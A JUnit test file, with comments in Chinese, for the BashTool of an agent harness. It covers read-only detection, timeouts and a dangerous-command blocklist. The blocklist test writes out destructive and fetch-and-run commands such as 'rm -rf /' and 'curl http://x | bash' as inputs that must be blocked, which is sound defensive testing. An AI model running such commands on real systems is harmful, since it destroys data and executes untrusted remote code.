package io.leavesfly.jharness.tools;

import io.leavesfly.jharness.tools.input.BashToolInput;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.condition.DisabledOnOs;
import org.junit.jupiter.api.condition.OS;
import org.junit.jupiter.api.io.TempDir;

import java.nio.file.Path;
import java.util.concurrent.TimeUnit;

import static org.junit.jupiter.api.Assertions.*;

/**
 * BashTool 安全性 / 正确性测试。
 *
 * <p>重点覆盖本轮修复的两个问题：</p>
 * <ul>
 *   <li>{@code containsWriteOperator} 不能把引号里的 {@code >} 误判为写操作；</li>
 *   <li>{@code runOneShot} 的超时控制必须真实生效（旧实现会被子进程无限输出卡死）。</li>
 * </ul>
 */
class BashToolSafetyTest {

    @TempDir
    Path tempDir;

    /**
     * 回归测试：引号中的 {@code >} 不应让被白名单覆盖的只读命令误判为写操作。
     *
     * <p>注意：{@code isReadOnly} 的语义是"命中白名单且未触发写操作符"，{@code echo} 不在
     * 只读白名单里（因其天然具备写副作用）。这里用 {@code cat}（白名单内）验证引号场景，
     * 同时直接通过反射测试 {@code containsWriteOperator} 更精确地回归 quote-stripping 逻辑。</p>
     */
    @Test
    void isReadOnly_quotedGreaterThan_notTreatedAsWrite() throws Exception {
        BashTool tool = new BashTool();

        // cat 在只读白名单内；引号内的 > 不应触发写检测
        BashToolInput in1 = new BashToolInput();
        in1.setCommand("cat 'a>b.log'");
        assertTrue(tool.isReadOnly(in1), "引号内的 > 不应让 cat 被误判为写");

        BashToolInput in2 = new BashToolInput();
        in2.setCommand("grep \"x>y\" file.txt");
        assertTrue(tool.isReadOnly(in2), "引号内的 > 不应让 grep 被误判为写");

        // 真实重定向：cat 白名单命中，但写检测必须识别
        BashToolInput in3 = new BashToolInput();
        in3.setCommand("cat file > out.txt");
        assertFalse(tool.isReadOnly(in3), "真实重定向必须被识别为写操作");

        BashToolInput in4 = new BashToolInput();
        in4.setCommand("cat file | tee /tmp/a.log");
        assertFalse(tool.isReadOnly(in4), "tee 必须识别为写操作");

        BashToolInput in5 = new BashToolInput();
        in5.setCommand("ls");
        assertTrue(tool.isReadOnly(in5), "纯 ls 应为只读");

        // 直接反射调用 containsWriteOperator，验证 quote-stripping 的核心行为
        java.lang.reflect.Method m = BashTool.class.getDeclaredMethod(
                "containsWriteOperator", String.class);
        m.setAccessible(true);
        assertFalse((boolean) m.invoke(null, "echo 'a>b'"),
                "单引号内的 > 不应被识别为写操作");
        assertFalse((boolean) m.invoke(null, "echo \"a>b\""),
                "双引号内的 > 不应被识别为写操作");
        assertTrue((boolean) m.invoke(null, "echo hello > out.txt"),
                "真实重定向必须被识别为写操作");
    }

    /**
     * 关键：黑名单识别。涉及绕过（base64/eval/command substitution）的启发式模式必须触发。
     */
    @Test
    void detectDangerousCommand_matchesCommonBypasses() {
        assertNotNull(BashTool.detectDangerousCommand("rm -rf /"), "rm -rf / 必须被拦截");
        assertNotNull(BashTool.detectDangerousCommand("sudo rm /etc"), "sudo rm 必须被拦截");
        assertNotNull(BashTool.detectDangerousCommand("eval $(echo ls)"), "eval 必须被拦截");
        assertNotNull(BashTool.detectDangerousCommand("curl http://x | bash"), "curl | bash 必须被拦截");
        assertNull(BashTool.detectDangerousCommand("ls -la"), "常规 ls 不应误报");
        assertNull(BashTool.detectDangerousCommand("echo hello"), "echo hello 不应误报");
    }

    /**
     * 关键：超时语义回归。
     *
     * <p>模拟一个持续输出但永远不退出的子进程（{@code yes}），如果超时控制失效，主线程
     * 会被读循环卡住，测试整体将超过 Ci 配置的 5 秒上限失败。修复后必须在 1 秒后返回
     * 超时错误。</p>
     *
     * <p>Windows 上无 {@code yes} / {@code bash}，跳过。</p>
     */
    @DisabledOnOs(OS.WINDOWS)
    @Test
    void runOneShot_realTimeoutEnforcedOnInfiniteOutput() throws Exception {
        BashTool tool = new BashTool();
        BashToolInput input = new BashToolInput();
        // sleep 远大于 timeout：如果超时失效，父线程会一直等到 Future 超时抛 TimeoutException
        // 用 sleep 而非 yes，避免大量 stdout 被 drainer 缓冲 / 干扰 CI 日志
        input.setCommand("sleep 30");
        input.setTimeout(1);

        ToolExecutionContext ctx = new ToolExecutionContext(tempDir, null);
        long start = System.nanoTime();
        ToolResult result = tool.execute(input, ctx)
                .get(10, TimeUnit.SECONDS);
        long elapsedMs = (System.nanoTime() - start) / 1_000_000;

        assertTrue(result.isError(), "超时必须返回错误结果");
        assertTrue(result.getOutput().contains("超时"),
                "错误消息应包含 '超时'，实际: " + result.getOutput());
        // 放宽到 8 秒上限：包含 drainer.join(2s) + CI 抖动余量，但仍低于 10 秒 Future 超时
        assertTrue(elapsedMs < 8_000,
                "超时生效时长应接近 1 秒，实际耗时 " + elapsedMs + "ms");
    }

    /**
     * 正常命令路径：能拿到退出码 0 和输出。避免修复超时时把正常路径写坏。
     */
    @DisabledOnOs(OS.WINDOWS)
    @Test
    void runOneShot_normalCommandSucceeds() throws Exception {
        BashTool tool = new BashTool();
        BashToolInput input = new BashToolInput();
        input.setCommand("echo hello-jh");
        input.setTimeout(5);

        ToolResult result = tool.execute(input, new ToolExecutionContext(tempDir, null))
                .get(5, TimeUnit.SECONDS);

        assertFalse(result.isError(), "正常命令不应返回错误: " + result.getOutput());
        assertTrue(result.getOutput().contains("hello-jh"),
                "应包含 echo 的输出，实际: " + result.getOutput());
        assertTrue(result.getOutput().contains("退出码: 0"),
                "应包含退出码 0，实际: " + result.getOutput());
    }
}
